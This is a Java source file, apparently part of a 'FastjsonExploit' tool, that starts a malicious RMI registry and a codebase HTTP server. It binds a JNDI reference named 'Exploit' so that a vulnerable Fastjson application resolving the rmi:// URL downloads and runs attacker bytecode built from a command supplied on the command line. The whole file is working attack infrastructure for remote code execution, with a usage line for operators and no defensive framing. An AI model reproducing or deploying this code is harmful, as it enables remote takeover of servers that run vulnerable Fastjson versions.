public class RMIServer {
	public static void lanuchRMIregister(java.lang.Integer rmi_port, java.lang.String callback_http_host, java.lang.Integer http_port) throws java.lang.Exception {
		java.rmi.registry.Registry registry = java.rmi.registry.LocateRegistry.createRegistry(rmi_port);
		java.lang.String remote_class_server = ((("http://" + callback_http_host) + ":") + http_port.toString()) + "/";
		javax.naming.Reference ref = new javax.naming.Reference("Exploit", "Exploit", remote_class_server);
		com.sun.jndi.rmi.registry.ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
		registry.bind("Exploit", referenceWrapper);
		java.lang.System.out.println(java.lang.String.format("[*] RMI server listening on: 0.0.0.0:%d (rmi://%s:%d/Exploit)", rmi_port, callback_http_host, rmi_port));
	}

	public static void main(java.lang.String[] args) throws java.lang.Exception {
		if (args.length != 3) {
			java.lang.System.out.println("Usage: java -cp FastjsonExploit-<version>.jar server.RMIServer ldap_host ldap_port [cmd/code]");
			java.lang.System.exit(0);
		}
		util.Common.byteCode = gadget.Gadget.getJndiDataSourceFactory1ExpCode(args[2]);
		java.lang.String server_ip = args[0];
		java.lang.Integer rmi_port = java.lang.Integer.valueOf(args[1]);
		int http_port = util.Util.getUnusePort(server_ip);
		server.CodebaseServer.lanuchCodebaseURLServer(server_ip, http_port);
		server.RMIServer.lanuchRMIregister(rmi_port, server_ip, http_port);
	}
}